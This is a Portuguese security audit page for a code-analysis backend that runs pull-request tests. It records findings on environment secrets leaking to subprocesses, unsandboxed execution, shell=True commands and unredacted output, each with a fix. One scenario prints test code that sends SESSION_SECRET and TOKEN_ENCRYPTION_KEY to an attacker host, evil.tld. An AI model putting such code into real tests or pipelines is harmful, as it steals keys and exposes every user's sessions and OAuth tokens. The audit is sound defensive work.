04 — Segurança

O ponto mais crítico: o pipeline executa código não-confiável do repositório analisado. Achados PA-11 a PA-14.

Premissa central: rodar install_command/test_command e a suíte de testes de um PR significa executar código arbitrário do repositório analisado no processo do backend. Tudo nesta página parte dessa realidade.

PA-11 — SESSION_SECRET e TOKEN_ENCRYPTION_KEY vazam para o subprocess não-confiável Crítico

Local
backend/app/services/runner_service.py:287-295 (_safe_env) 
SECRET_ENV_PREFIXES = ("GITHUB_", "OPENAI_", "LANGSMITH_")
SECRET_ENV_NAMES = {"DATABASE_URL"}

def _safe_env() -> dict[str, str]:
    safe = {}
    for key, value in os.environ.items():
        if key in SECRET_ENV_NAMES: continue
        if any(key.startswith(prefix) for prefix in SECRET_ENV_PREFIXES): continue
        safe[key] = value
    return safe
Mecanismo

A allowlist/blocklist remove só DATABASE_URL e prefixos GITHUB_/OPENAI_/LANGSMITH_. Mas dois segredos de altíssimo valor não têm esses prefixos e passam para o ambiente do subprocess:

  • SESSION_SECRET — usado em session_service.py:23 para assinar (HMAC) os cookies de sessão. Quem o tem forja a sessão de qualquer usuário.
  • TOKEN_ENCRYPTION_KEY — usado em token_crypto_service.py:12 para cifrar/decifrar os tokens OAuth do GitHub de todos os usuários guardados no banco. Quem o tem decifra todos eles.
Cenário concreto

Um PR malicioso adiciona em qualquer arquivo de teste:

import os, urllib.request
urllib.request.urlopen("https://evil.tld/x?s=" + os.environ.get("SESSION_SECRET","")
                       + "&k=" + os.environ.get("TOKEN_ENCRYPTION_KEY",""))

Ao analisar esse PR, pytest roda esse teste no servidor → os segredos são exfiltrados → o atacante forja sessões e decifra tokens OAuth de todos os usuários. Comprometimento total da multi-tenância.

Correção (imediata)

Inverter para allowlist: o subprocess recebe só um conjunto mínimo conhecido (PATH, HOME, LANG, e o que o toolchain exigir), nunca herdando o ambiente inteiro. Ver fixes/03.

PA-12 — Execução de código arbitrário sem sandbox/isolamento Crítico

Local
runner_service.py:249-284 (run_command com shell=True), chamado pelos três gates no mesmo processo/host do backend.
Mecanismo

Mesmo com PA-11 corrigido, o código do PR ainda roda com os privilégios do processo do backend: acesso à rede interna (metadata da cloud, banco em /tmp-reachable, serviços internos), ao filesystem da aplicação e à possibilidade de consumir CPU/disco (DoS). A allowlist de env reduz o vazamento de segredos, mas não isola a execução.

Impacto

SSRF para o endpoint de metadados da cloud (roubo de credenciais de infra), leitura do código/segredos montados no container, mineração/DoS, pivot para o Postgres. Isto é inerente a "rodar testes de PR" — precisa de isolamento de verdade.

Correção

Executar a análise em um sandbox descartável e sem rede privilegiada: container efêmero por run com rede egress restrita, usuário não-root, limites de CPU/mem/disco e sem credenciais de infra montadas — ou delegar a execução ao runner do próprio repositório (GitHub Actions), onde o blast radius é a conta do cliente, não a sua. Ver fixes/03 e fixes/02.

PA-13 — Comandos configuráveis executados com shell=True; saída persistida pode conter segredos Médio

Local
runner_service.py:258 (subprocess.run(command, shell=True)) · coverage_execution_config (install_command, test_command)
Mecanismo

Os comandos vêm de configuração editável por admins do repositório e são passados verbatim ao shell. Combinado com PA-11/PA-12, um admin (ou qualquer um que consiga editar a config) tem execução de comando estável no servidor. Além disso, stdout/stderr (últimos 4000 chars) são salvos em coverage_result_json.commands[] e podem ser publicados em comentários no GitHub (github_publication_service) — se o build imprimir um token/secret, ele é persistido e exposto.

Correção

Após o isolamento (PA-12), tratar install_command/test_command como input não-confiável; idealmente restringir a um conjunto de comandos/templates conhecidos por linguagem em vez de shell livre, e redigir a saída antes de persistir. Ver fixes/03.

PA-14 — redacted_command só redige o token do clone, não a saída dos comandos Baixo

Local
runner_service.py:241-246 (redacted_command) e CommandResult.to_snapshot (linha 38)
Mecanismo

redacted_command só substitui x-access-token:...@ no texto do comando. O stdout/stderr guardados no snapshot não passam por nenhuma redação. Como o token de instalação é injetado na URL de clone e pode aparecer em mensagens de erro de rede/git, há risco de o token de instalação (ou outros segredos ecoados pelo build) acabar no snapshot e em comentários do GitHub.

Correção

Aplicar uma redação de padrões (tokens ghs_/github_pat_, x-access-token, chaves) também sobre stdout/stderr antes de persistir. Ver fixes/03.

Itens de segurança que estão corretos (manter)

  • Verificação de assinatura do webhook com hmac.compare_digest (constante no tempo) — correto.
  • Validação de path-traversal no tarball (_validate_archive_members, extractall(filter="data")) e no working_directory (is_relative_to) — boas defesas, manter.
  • Tokens de instalação de curta duração em vez de PAT — alinhado ao gotcha do backend/CLAUDE.md ("Do not add GITHUB_TOKEN back").
  • CSRF exigido nas rotas mutáveis (require_csrf_token) — correto.
